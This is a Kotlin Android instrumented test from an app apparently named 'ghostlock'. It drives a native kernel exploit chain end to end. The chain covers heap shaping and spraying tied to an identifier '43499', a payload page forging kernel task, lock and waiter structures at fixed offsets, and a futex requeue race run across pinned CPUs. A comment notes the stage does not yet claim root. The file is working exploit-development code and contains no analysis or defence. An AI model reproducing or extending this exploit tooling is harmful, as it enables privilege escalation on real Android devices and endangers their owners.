package com.ghostlock.app

import android.util.Log
import androidx.test.ext.junit.runners.AndroidJUnit4
import com.ghostlock.app.engine.ktstep.KernelFutexWords
import com.ghostlock.app.engine.ktstep.LockFields
import com.ghostlock.app.engine.ktstep.NativeAttemptParams
import com.ghostlock.app.engine.ktstep.NativeAttemptResult
import com.ghostlock.app.engine.ktstep.NativeJniAttemptPort
import com.ghostlock.app.engine.ktstep.NativeKernelSyscalls
import com.ghostlock.app.engine.ktstep.NativePrepare43499Port
import com.ghostlock.app.engine.ktstep.NativePrepareParams
import com.ghostlock.app.engine.ktstep.NativePrepareResult
import com.ghostlock.app.engine.ktstep.PayloadPageInputs
import com.ghostlock.app.engine.ktstep.PayloadSlots
import com.ghostlock.app.engine.ktstep.PayloadValues
import com.ghostlock.app.engine.ktstep.SyscallResult
import com.ghostlock.app.engine.ktstep.TaskFields
import com.ghostlock.app.engine.ktstep.WaiterFields
import com.ghostlock.app.engine.ktstep.WriteLayout
import com.ghostlock.app.engine.ktstep.WriteMode
import com.ghostlock.app.engine.ktstep.WriteRequest
import com.ghostlock.app.engine.ktstep.buildPayloadPage
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith

/** N3：prepare 的真实 base/fd + Kotlin 页 + actor；仍不声明 root。 */
@RunWith(AndroidJUnit4::class)
class N3PrepareInstrumentedTest {
    @Test
    fun thePreparedShapingFdCarriesThePageIntoTheActorRun() {
        val syscalls = NativeKernelSyscalls()
        val prepare = NativePrepare43499Port()
        assertTrue(prepare.open() is SyscallResult.Ok)
        val prepared = prepare.prepare(
            NativePrepareParams(
                pageSize = 4096,
                mmStructSize = 1024,
                mmSlabOrder = 2,
                collisions = 4,
                threadCount = 4,
                possibleCpus = 8,
                proofCount = 4,
                proofSeed = 0,
                rangeStart = 0xffffff8000000000uL.toLong(),
                rangeEnd = 0xffffffc000000000uL.toLong(),
                counterOffset = 0x1000,
                wakeRounds = 64,
                roundTimeoutUs = 1000,
                headerBytes = 0x1000,
                totalPokes = 32768,
                wordBytes = 8,
                handleBytes = 8,
                preGroups = 1,
                preShapedGroups = 0,
                sprayGroups = 1,
                postGroups = 1,
                leakGroups = 1,
                snitchCollisions = 4,
                maxAttempts = 4,
                pollRounds = 64,
                socketBuffer = 0x100000,
                mainCpu = 0,
                sweepTags = false,
            ),
        )
        assertTrue(prepared is NativePrepareResult.Ok)
        val answer = prepared as NativePrepareResult.Ok
        Log.i(TAG, "prepared=" + answer)
        assertTrue(answer.base != 0L)
        assertTrue(answer.shapingFd >= 0)

        val base = answer.base + (-0xE80L)
        val slots = PayloadSlots(0x0E80, 0x1180, 0x1280, 0x1080, 0x0F80)
        val page = ByteArray(0x4000)
        val inputs = PayloadPageInputs(
            slots = slots,
            lock = LockFields(0, 8, 16, 24),
            waiter = WaiterFields(0, 8, 16, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x44, 0x48, 0x50),
            task = TaskFields(0x40, 0x84, 0x8C, 0x90C, 0x920, 0x930, 0x938, 0x348),
            values = PayloadValues(0x100, 120, 140),
            waiterWord = base + 0x1180L,
            waiterTask = 0L,
            fakeTask = base + 0x1280L,
            fakeLock = base + 0x0E80L,
            taskGroup = 0L,
            piTopTask = 0L,
            pointerBytes = 8,
        )
        assertEquals(
            com.ghostlock.app.engine.ktstep.LayoutVerdict.Ok,
            buildPayloadPage(page, inputs, WriteRequest(base, WriteMode.Zero, true), WriteLayout(base - 8L, 0x10000010001L, 0L, false)),
        )

        val buffer = ByteArray(0x10000)
        page.copyInto(buffer, 0)
        page.copyInto(buffer, 0x8000)
        val words = when (val made = KernelFutexWords.create(syscalls, waitTimeoutNs = -1L)) {
            is com.ghostlock.app.engine.ktstep.FutexWordsResult.Ok -> made.words
            is com.ghostlock.app.engine.ktstep.FutexWordsResult.Errno -> error("words:" + made.code)
        }
        val attempt = NativeJniAttemptPort()
        assertTrue(attempt.open() is SyscallResult.Ok)
        val result = attempt.attempt(
            NativeAttemptParams(
                chainAddress = words.chain.address,
                waitAddress = words.wait.address,
                targetAddress = words.target.address,
                pageSinkAddress = 1L,
                chainValue = 0,
                waitValue = 0,
                targetValue = 0,
                page = buffer,
                pointerBytes = 8,
                parkTimeoutNs = -1L,
                joinTimeoutMs = 3_000,
                settleUs = 500,
                waiterCpu = 0,
                ownerCpu = 1,
                requeueCpu = 2,
                waiterNice = 0,
                ownerNice = 0,
                requeueNice = 0,
                policy = 0,
                pageFd = answer.shapingFd,
            ),
        )
        attempt.close()
        words.close()
        syscalls.close(answer.shapingFd)
        syscalls.close(answer.shapingPeerFd)
        prepare.close()
        Log.i(TAG, "n3-prepare=" + result)
        assertTrue(result is NativeAttemptResult.Ok)
        val final = result as NativeAttemptResult.Ok
        assertEquals(buffer.size, final.pageBytesWritten)
        assertTrue(final.actorsStarted)
    }

    private companion object { const val TAG = "N3Prepare" }
}
